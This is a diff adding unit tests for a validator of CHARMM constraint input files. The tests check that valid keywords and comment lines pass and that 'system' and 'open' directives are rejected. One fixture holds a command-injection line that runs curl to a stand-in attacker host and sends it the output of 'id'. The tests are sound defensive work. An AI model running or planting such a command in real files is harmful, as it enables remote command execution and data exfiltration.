@@ -454,4 +454,62 @@ describe('isValidConstInpFile', () => {
     const result = await isValidConstInpFile(mockFile(), 'pdb')
     expect(result).toMatch(/last line must be "return"/)
   })
+
+  it('rejects a file containing a "system" directive', async () => {
+    const content = [
+      'define fixed1 sele ( resid 1:5 .and. segid PROA ) end',
+      'cons fix sele fixed1 end',
+      'system "curl https://attacker.example/?x=$(id)"',
+      'return'
+    ].join('\n')
+    mockReadFile(content)
+    const result = await isValidConstInpFile(mockFile(), 'pdb')
+    expect(result).toMatch(/Disallowed keyword/)
+  })
+
+  it('rejects a file containing an "open" directive', async () => {
+    const content = [
+      'define fixed1 sele ( resid 1:5 .and. segid PROA ) end',
+      'cons fix sele fixed1 end',
+      'open unit 10 write card name /tmp/evil',
+      'return'
+    ].join('\n')
+    mockReadFile(content)
+    const result = await isValidConstInpFile(mockFile(), 'pdb')
+    expect(result).toMatch(/Disallowed keyword/)
+  })
+
+  it('accepts comment lines starting with "!" alongside valid keywords', async () => {
+    const content = [
+      '! constraint file header',
+      'define fixed1 sele ( resid 1:5 .and. segid PROA ) end',
+      'cons fix sele fixed1 end',
+      '! end of constraints',
+      'return'
+    ].join('\n')
+    mockReadFile(content)
+    expect(await isValidConstInpFile(mockFile(), 'pdb')).toBe(true)
+  })
+
+  it('accepts comment lines starting with "*" alongside valid keywords', async () => {
+    const content = [
+      '* CHARMM constraint file',
+      'define fixed1 sele ( resid 1:5 .and. segid PROA ) end',
+      'cons fix sele fixed1 end',
+      'return'
+    ].join('\n')
+    mockReadFile(content)
+    expect(await isValidConstInpFile(mockFile(), 'pdb')).toBe(true)
+  })
+
+  it('accepts "cons harm" lines for harmonic constraints', async () => {
+    const content = [
+      'define fixed1 sele ( resid 1:5 .and. segid PROA ) end',
+      'cons fix sele fixed1 end',
+      'cons harm force 10.0 sele fixed1 end',
+      'return'
+    ].join('\n')
+    mockReadFile(content)
+    expect(await isValidConstInpFile(mockFile(), 'pdb')).toBe(true)
+  })
 })
